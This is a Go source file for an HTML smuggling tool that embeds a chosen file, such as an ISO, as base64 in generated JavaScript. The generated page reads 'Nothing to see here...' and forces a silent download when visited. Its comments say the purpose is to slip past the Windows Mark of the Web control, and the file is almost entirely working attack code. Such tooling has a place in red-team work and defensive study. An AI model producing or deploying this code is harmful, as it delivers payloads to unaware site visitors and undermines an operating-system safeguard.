package main

import (
	cf "commonFunctions"
	"encoding/base64"
	"flag"
	"fmt"
	"os"
)

/*
Purpose:
Create files that can be placed on a web server to conduct HTML Smuggling.  The prog takes a file specified and will base64 encode it, detect its mime type and then
auto-download the file as someone visits the site.  This is created primarily for ISO files which if downloaded may work around the Mark of the Web control
that is built into Windows 10+

Setup the Environment

go env -w GOROOT="/usr/lib/go"
go env -w GOPATH="/home/thepcn3rd/go/workspaces/htmlSmuggling"

Make the directories - src
Copy the commonFunctions folder into the src directory so that it can be referenced

// To cross compile for linux
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o htmSmuggling.bin -ldflags "-w -s" main.go

// To cross compile windows
GOOS=windows GOARCH=amd64 go build -o htmlSmuggling.exe -ldflags "-w -s" main.go

References:
Initial code was built by ChatGPT on 11/1/2023

*/

func createIndexHTML() string {
	var indexHTMLContent string
	indexHTMLContent = "<html>" + "\n"
	indexHTMLContent += "\t" + "<head>" + "\n"
	indexHTMLContent += "\t\t" + "<title>T1027.006 - HTML Smuggling</title>" + "\n"
	indexHTMLContent += "\t" + "</head>" + "\n"
	indexHTMLContent += "\t" + "<body>" + "\n"
	indexHTMLContent += "\t\t" + "<p>Nothing to see here...</p>" + "\n"
	indexHTMLContent += "\t\t" + "<script type='text/javascript' src='my.js'></script>" + "\n"
	indexHTMLContent += "\t" + "</body>" + "\n"
	indexHTMLContent += "</html>" + "\n"
	return indexHTMLContent
}

func createJSContent(b64Content string, outputFilename string) string {
	var myJSContent string
	myJSContent += "" + "function convertFromBase64(base64) {" + "\n"
	myJSContent += "\t" + "  var binary_string = window.atob(base64);" + "\n"
	myJSContent += "\t" + "  var len = binary_string.length;" + "\n"
	myJSContent += "\t" + "  var bytes = new Uint8Array( len );" + "\n"
	myJSContent += "\t" + "  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }" + "\n"
	myJSContent += "\t" + "  return bytes.buffer;" + "\n"
	myJSContent += "" + "}" + "\n"
	myJSContent += "" + "\n"
	myJSContent += "" + "var file ='" + b64Content + "';" + "\n"
	myJSContent += "" + "var data = convertFromBase64(file);" + "\n"
	myJSContent += "" + "var blob = new Blob([data], {type: 'octet/stream'});" + "\n"
	myJSContent += "" + "var fileName = '" + outputFilename + "';" + "\n"
	myJSContent += "" + "var a = document.createElement('a');" + "\n"
	myJSContent += "" + "var url = window.URL.createObjectURL(blob);" + "\n"
	myJSContent += "" + "document.body.appendChild(a);" + "\n"
	myJSContent += "" + "a.style = 'display: none';" + "\n"
	myJSContent += "" + "a.href = url;" + "\n"
	myJSContent += "" + "a.download = fileName;" + "\n"
	myJSContent += "" + "a.click();" + "\n"
	myJSContent += "" + "window.URL.revokeObjectURL(url);" + "\n"
	return myJSContent
}

func main() {
	inputFilename := flag.String("i", "", "Specify the file that you are smuggling in HTML")
	outputFilename := flag.String("o", "info.iso", "Specify the file that is downloaded by the browser")
	flag.Parse()

	if !cf.IsFlagPassed("i") {
		fmt.Println("Specify a file to include in the HTML for smuggling...")
		flag.Usage()
		os.Exit(0)
	}

	// Read file indicated into a base64 string to be saved in my.js
	file, err := os.Open(*inputFilename)
	cf.CheckError("Unable to open file specified", err, true)
	defer file.Close()
	fileInfo, _ := file.Stat()
	fileBytes := make([]byte, fileInfo.Size())
	_, err = file.Read(fileBytes)
	cf.CheckError("Unable to convert the file into a byte array", err, true)
	base64Content := base64.StdEncoding.EncodeToString(fileBytes)

	cf.CreateDirectory("/output")

	cf.SaveOutputFile(createIndexHTML(), "output/index.html")
	fmt.Println("index.html was created")

	cf.SaveOutputFile(createJSContent(base64Content, *outputFilename), "output/my.js")
	fmt.Println("my.js was created")
}
